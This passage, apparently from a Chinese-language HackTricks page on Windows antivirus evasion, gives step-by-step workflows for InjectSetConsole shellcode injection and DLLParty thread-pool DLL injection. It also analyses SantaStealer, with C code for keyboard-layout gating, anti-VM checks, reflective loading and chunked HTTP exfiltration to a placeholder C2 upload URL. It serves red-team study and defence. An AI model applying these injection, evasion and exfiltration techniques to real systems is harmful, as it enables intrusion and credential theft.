3. 通过父进程端的 `STDIN` 句柄，使用 `WriteFile` 发送完整的二进制 `rawData` 数组。控制台程序会读取这些字节，并在其某个私有提交区域中留下一份副本。
4. 使用 `VirtualQueryEx` 遍历子进程的地址空间，通过 `ReadProcessMemory` 读取候选 `MEM_PRIVATE` 区域，并搜索 `rawData` 开头的标记。
5. 使用 `VirtualProtectEx` 将找到的缓冲区改为 `PAGE_EXECUTE_READWRITE`。
6. 找到主线程，将其挂起，使用 `NtSetContextThread` 将 `RIP` 设为 `found_address + 0x19`，然后恢复线程。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供的实现针对 x64：它会修改 `CONTEXT.Rip`，嵌入的 payload 则是 x64 shellcode。`rawData` 以 25 字节标记开头，因此可执行字节从十六进制偏移 `0x19` 开始。替换 payload 时，需保留该布局，或同时更新标记、搜索向量、数组大小和执行偏移。源代码注释还将 `0x0A`、`0x0D` 和 `0x1A` 列为坏字符。此工作流不会更改子进程的 token 或权限。<sup>[[41]](#references)</sup>

有关小型原生辅助程序和 payload 编译模式，请参阅 [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)。

## 无 shellcode 的线程池回调 DLL 注入（DLLParty）

DLLParty 改造了 PoolParty 风格的线程池注入，使现有目标 worker 调用 `LoadLibraryA`，而不是执行注入的回调 stub。它的分发原语是排入目标池 I/O completion port 的 `TP_DIRECT` completion。这并不会绕过进程权限：PoC 会调用 `OpenProcess(PROCESS_ALL_ACCESS)`，并且需要目标内存可读写，且 worker-factory 和 completion-port 句柄可被复制。<sup>[[46]](#references)[[47]](#references)</sup>

在 Windows x64 上，worker 会将指向其栈上 `TP_CALLBACK_INSTANCE` 的指针放入 `RCX`，作为第一个回调参数。`LoadLibraryA` 会将同一指针解释为 `LPCSTR`。在测试路径中，`TppWorkerThread` 会在 `RSP+0x178` 处构造该指针，而它对该对象的首次常规写入发生在 `RSP+0x1d0`。因此，只要以 null 结尾的 DLL 路径能放入这段 0x58 字节的前缀，就可以写在实例的开头，且在分发前不会被覆盖。这是针对特定 build 的观察结果，并非文档规定的 Windows ABI 保证。<sup>[[46]](#references)[[47]](#references)</sup>

参考工作流如下：<sup>[[46]](#references)[[47]](#references)</sup>

1. 使用 `NtQuerySystemInformation(SystemHandleInformation)` 枚举目标的句柄，并通过查询对象类型识别 `TpWorkerFactory`。复制一个 worker-factory 句柄并查询 `WorkerFactoryBasicInformation`；`StartParameter` 给出远程 `TP_POOL`。跳过 `TotalWorkerCount == 0` 的 factory。
2. 读取 `TP_POOL.CompletionPort` 并遍历池的私有 worker 链表。在测试的 Windows 10 19045 x64 build（`ntdll.dll 10.0.19041.4842`）中，链表头位于 `pool+0x60`；每个链接位于 `worker+0x10`，因此 `worker+0x38` 处的 callback-instance 槽等于 `link+0x28`。PoC 会检查指针对齐、链接互反关系、池归属、非零线程 ID、重复节点以及稳定的链表头。
3. 将 DLL 路径写入**每个**找到的 worker 槽，因为排入队列的 completion 可能由任意 worker 处理。在可写的目标内存中放置一个 `TP_DIRECT`，并将 `Callback = LoadLibraryA`。PoC 使用 worker 栈上的 `last_slot-0x500`，而不是 `VirtualAllocEx`；该偏移是实验所得，不得与活动栈数据冲突。
4. 复制目标 completion-port 句柄，并调用 `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`。远程 `TP_DIRECT` 地址就是 completion key。随后，现有 worker 会使用被覆盖的 callback-instance 指针调用 `LoadLibraryA`，加载目标已可访问的 DLL。

PoC 接受目标 PID（`DLLParty.exe <target_pid>`），并在 `DLLParty.cpp` 中硬编码 DLL 路径；构建 x64 可执行文件前，应设置目标可访问的路径。它还会将自身进程中的 `LoadLibraryA` 地址用作远程回调，因此假定该地址在目标中有效。代码不会检查路径长度是否超出 0x58 字节前缀，也不会检查 worker 遍历是否找到了槽位，就直接索引最后一个元素。请针对目标 build 重新验证私有偏移、栈布局和可写空间。不使用 `CreateRemoteThreadEx`、shellcode 和 `VirtualAllocEx`，并不意味着没有跨进程写入或 DLL 加载遥测。<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer 用于无文件规避和凭据窃取的 Tradecraft

SantaStealer（又名 BluelineStealer）展示了现代信息窃取程序如何在单一工作流中结合 AV bypass、反分析和凭据访问。<sup>[[24]](#references)</sup>

### 键盘布局门控与沙箱延迟

- 一个配置标志（`anti_cis`）会通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现西里尔文布局，样本会创建一个空的 `CIS` 标记并终止，然后才运行 stealer，从而确保它不会在被排除的地区触发，同时留下供 hunting 使用的痕迹。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 分层的 `check_antivm` 逻辑

- Variant A 遍历进程列表，用自定义滚动校验和对每个名称进行哈希，并与内嵌的 debugger/sandbox blocklist 比较；随后对计算机名称重复进行校验和计算，并检查 `C:\analysis` 等工作目录。
- Variant B 检查系统属性（进程数量下限、近期启动时间），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox additions，并在 sleep 前后进行计时检查，以发现单步执行。任何检测命中都会在模块启动前中止。

### 无文件 helper + 双重 ChaCha20 反射式加载

- 主 DLL/EXE 内嵌一个 Chromium 凭据 helper，该 helper 会被写入磁盘，或手动映射到内存中；无文件模式会自行解析 imports/relocations，因此不会写入 helper 文件。
- 该 helper 使用 ChaCha20 对第二阶段 DLL 加密两次（两个 32 字节密钥 + 12 字节 nonce）。两轮解密后，它会反射式加载该 blob（不使用 `LoadLibrary`），并调用从 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 派生的导出函数 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。<sup>[[25]](#references)</sup>
- ChromElevator routines 使用 direct-syscall reflective process hollowing 将代码注入正在运行的 Chromium 浏览器，继承 AppBound Encryption keys，并直接从 SQLite 数据库解密 passwords/cookies/credit cards，即使 ABE 已加固也能做到。

### 模块化内存收集与分块 HTTP 外传

- `create_memory_based_log` 遍历全局 `memory_generators` 函数指针表，并为每个启用的模块（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）创建一个线程。每个线程将结果写入共享缓冲区，并在约 45 秒的 join 等待窗口后报告文件数量。
- 完成后，所有内容都会使用静态链接的 `miniz` 库压缩为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` sleep 15 秒，并通过 HTTP POST 将压缩包分成 10 MB 的块发送到 `http://<C2>:6767/upload`，同时伪装成浏览器的 `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个块都会附带 `User-Agent: upload`、`auth: <build_id>`，以及可选的 `w: <campaign_tag>`；最后一个块会附加 `complete: true`，通知 C2 重组已完成。

## References

- [1] [高级规避手法：精准 Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – 博客](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – 调用栈：恶意软件不再能轻易逃脱检测](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – 文档](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – 示例](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – 示例](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – 调用栈欺骗 PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer 的新感染链与基于 ConfuserEx 的混淆](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 你的零信任值得信任吗？绕过 Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 之前：探究 Storm-2603 以往的勒索软件行动](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：滥用转发导出](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 转发导出清单 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – 动态链接库搜索顺序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – 进程安全性与访问权限](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU 参考 (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – 借助 Protected Process Light (PPL) 对抗 EDR](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – 使用文件夹重定向技术攻破 Windows Defender 的保护层](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink 命令参考](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – 揭开 Pure 的面纱：从 RAT 到 Builder 再到 Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer 即将登场：一种雄心勃勃的新型信息窃取程序](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption 解密](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：通过 API 跟踪击败 Node.js 恶意软件](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [睡美人：使用 Crystal Palace 让 Adaptix 进入休眠](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – 进程参数投毒](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [睡美人 II：CFG、CET 与 Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - 隐藏你的 Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - 红队行动中滥用 Chrome Remote Desktop：实用指南](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：将 Defender 的修复驱动程序武器化为内核操作原语](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo 配套代码](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：使用 LLVM 构建自我隐藏函数](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole 源码](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 函数](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - 创建具有重定向输入和输出的子进程](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy：使用 WasmForge 重铸 C# 工具](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - 编译 C# / .NET 项目](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty 概念验证与源代码](https://github.com/epersic/DLLParty)
- [47] [DLLParty — 滥用线程池内部机制实现无 shellcode 的 DLL 注入](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 基准数据集与 thrember 工具](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [使用 EMBER2024 评估红队 implant](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – 规避基于机器学习的检测](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
